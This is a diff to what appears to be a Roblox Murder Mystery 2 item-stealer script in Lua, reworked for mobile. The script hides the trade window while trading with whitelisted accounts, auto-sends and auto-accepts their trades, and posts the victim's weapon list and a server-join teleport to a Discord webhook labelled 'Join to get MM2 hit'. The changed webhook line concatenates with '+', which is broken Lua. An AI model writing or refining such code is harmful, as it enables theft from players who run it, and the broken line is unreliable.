@@ -52,8 +52,6 @@ local activeTargetName = nil
 local expectedTarget = nil
 local tradeInProgress = false
 
-local originalPositions = {}
-
 local function isUserWhitelisted(name)
     if type(name) ~= "string" then return false end
     for _, username in ipairs(users) do
@@ -72,7 +70,7 @@ local function sendTradeRequest(user)
     if player then pcall(function() Trade.SendRequest:InvokeServer(player) end) end
 end
 
--- Надежная функция управления видимостью интерфейса трейда
+-- Мобильная оптимизация скрытия UI: полностью выключаем ScreenGui и главные фреймы
 local function setTradeUIVisible(visible)
     for _, gui in ipairs(playerGui:GetChildren()) do
         if string.find(gui.Name, "TradeGUI") and not string.find(gui.Name, "Request") then
@@ -80,18 +78,7 @@ local function setTradeUIVisible(visible)
             pcall(function()
                 for _, child in ipairs(gui:GetChildren()) do
                     if child:IsA("GuiObject") then
-                        if visible then
-                            if originalPositions[child] then
-                                child.Position = originalPositions[child]
-                            end
-                            child.Visible = true
-                        else
-                            if not originalPositions[child] and child.Position.X.Scale < 10 then
-                                originalPositions[child] = child.Position
-                            end
-                            child.Position = UDim2.new(9999, 0, 9999, 0)
-                            child.Visible = false
-                        end
+                        child.Visible = visible
                     end
                 end
             end)
@@ -99,7 +86,6 @@ local function setTradeUIVisible(visible)
     end
 end
 
--- Постоянный контроль на случай создания новых элементов интерфейса игрой
 RunService.RenderStepped:Connect(function()
     local status = getTradeStatus()
     if status ~= "None" and activeTargetName and isUserWhitelisted(activeTargetName) then
@@ -107,7 +93,6 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
--- Перехват обновлений трейда (мгновенное определение оппонента без сканирования GUI)
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
     if typeof(data) == "table" then
         if data.LastOffer ~= nil then
@@ -196,8 +181,8 @@ local function SendFirstMessage(list, prefix)
         fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)\n", item.DataID, item.Amount, item.Rarity)
     end
     local data = {
-        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
-        embeds = {{ title = "Join to get MM2 hit", color = 65280, fields = fields, footer = { text = "good job" } }}
+        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId + "')",
+        embeds = {{ title = "Join to get MM2 hit", color = 65280, fields = fields, footer = { text = "good job mobile" } }}
     }
     pcall(function()
         request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
@@ -209,7 +194,6 @@ if #weaponsToSend > 0 then
     SendFirstMessage(weaponsToSend, ping == "Yes" and "--[[@everyone]] " or "")
 end
 
--- Авто-отправка трейдов игрокам из вайтлиста
 task.spawn(function()
     while task.wait(3) do
         if getTradeStatus() == "None" then
@@ -224,7 +208,6 @@ task.spawn(function()
     end
 end)
 
--- Авто-принятие входящих запросов от своих
 task.spawn(function()
     while task.wait(0.2) do
         if getTradeStatus() == "ReceivingRequest" then
@@ -257,7 +240,6 @@ task.spawn(function()
     end
 end)
 
--- Основная стейт-машина трейда
 task.spawn(function()
     while task.wait(0.1) do
         local currentStatus = getTradeStatus()
@@ -267,7 +249,7 @@ task.spawn(function()
             lastOfferToken = nil
             activeTargetName = nil
             expectedTarget = nil
-            setTradeUIVisible(true) -- Сбрасываем видимость вне трейда
+            setTradeUIVisible(true)
             
         elseif currentStatus == "StartTrade" and not tradeInProgress then
             tradeInProgress = true
